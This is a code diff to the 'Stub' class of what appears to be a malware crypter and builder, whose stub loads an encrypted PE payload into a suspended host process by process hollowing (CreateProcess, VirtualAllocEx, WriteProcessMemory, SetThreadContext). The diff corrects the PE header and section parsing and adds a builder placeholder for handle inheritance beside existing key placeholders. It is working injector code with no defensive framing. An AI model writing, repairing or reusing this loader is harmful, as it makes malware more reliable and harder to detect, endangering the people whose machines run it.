@@ -170,8 +170,11 @@ class Stub
         STARTUPINFO si = new STARTUPINFO(); PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); si.cb = Marshal.SizeOf(si);
         try
         {
-            if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) throw new Exception(""CreateProcess failed"");
-            int e_lfanew = BitConverter.ToInt32(payload, 60); int opHeader = e_lfanew + 24; short magic = BitConverter.ToInt16(payload, opHeader);
+            if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, [INHERIT_HANDLES], 0x4, IntPtr.Zero, null, ref si, out pi)) throw new Exception(""CreateProcess failed"");
+            int e_lfanew = BitConverter.ToInt32(payload, 60);
+            int fileHeader = e_lfanew + 4;
+            int opHeader = fileHeader + 20;
+            short magic = BitConverter.ToInt16(payload, opHeader);
             long imageBase;
             IntPtr context;
 
@@ -185,15 +188,20 @@ class Stub
             if (newImageBase == IntPtr.Zero) throw new Exception(""VirtualAllocEx failed"");
             int bytesWritten = 0;
             WriteProcessMemory(pi.hProcess, newImageBase, payload, (int)BitConverter.ToUInt32(payload, opHeader + 60), ref bytesWritten);
-            for (int i = 0; i < BitConverter.ToInt16(payload, e_lfanew + 6); i++) {
-                int sectionOffset = opHeader + BitConverter.ToInt16(payload, opHeader - 2) + (i * 40);
-                int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 16);
+
+            short numberOfSections = BitConverter.ToInt16(payload, fileHeader + 2);
+            int sectionHeaderOffset = opHeader + BitConverter.ToInt16(payload, fileHeader + 16);
+
+            for (int i = 0; i < numberOfSections; i++) {
+                int currentSectionOffset = sectionHeaderOffset + (i * 40);
+                int sizeOfRawData = BitConverter.ToInt32(payload, currentSectionOffset + 16);
                 if (sizeOfRawData > 0) {
                     byte[] sectionData = new byte[sizeOfRawData];
-                    Buffer.BlockCopy(payload, BitConverter.ToInt32(payload, sectionOffset + 20), sectionData, 0, sectionData.Length);
-                    WriteProcessMemory(pi.hProcess, (IntPtr)(newImageBase.ToInt64() + BitConverter.ToInt32(payload, sectionOffset + 12)), sectionData, sectionData.Length, ref bytesWritten);
+                    Buffer.BlockCopy(payload, BitConverter.ToInt32(payload, currentSectionOffset + 20), sectionData, 0, sectionData.Length);
+                    WriteProcessMemory(pi.hProcess, (IntPtr)(newImageBase.ToInt64() + BitConverter.ToInt32(payload, currentSectionOffset + 12)), sectionData, sectionData.Length, ref bytesWritten);
                 }
             }
+
             if (magic == 0x10b) { long eax = Marshal.ReadInt64(context, 44); WriteProcessMemory(pi.hProcess, (IntPtr)(eax + 8), BitConverter.GetBytes(newImageBase.ToInt64()), 4, ref bytesWritten); Marshal.WriteInt64(context, 32, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); if (IntPtr.Size == 4) SetThreadContext(pi.hThread, context); else Wow64SetThreadContext(pi.hThread, context); }
             else { long rdx = Marshal.ReadInt64(context, 136); WriteProcessMemory(pi.hProcess, (IntPtr)(rdx + 16), BitConverter.GetBytes(newImageBase.ToInt64()), 8, ref bytesWritten); Marshal.WriteInt64(context, 128, newImageBase.ToInt64() + BitConverter.ToUInt32(payload, opHeader + 40)); SetThreadContext(pi.hThread, context); }
             Marshal.FreeHGlobal(context);
@@ -317,6 +325,7 @@ class Stub
             stubSource = stubSource.Replace("[KEY2]", key2);
             stubSource = stubSource.Replace("[KEY3]", key3);
             stubSource = stubSource.Replace("[SHIFT_KEY]", shiftKey.ToString());
+            stubSource = stubSource.Replace("[INHERIT_HANDLES]", debugMode ? "true" : "false");
 
             string resourceFileName = Path.Combine(Path.GetTempPath(), resourceName + ".resources");
             using (var resourceWriter = new ResourceWriter(resourceFileName))
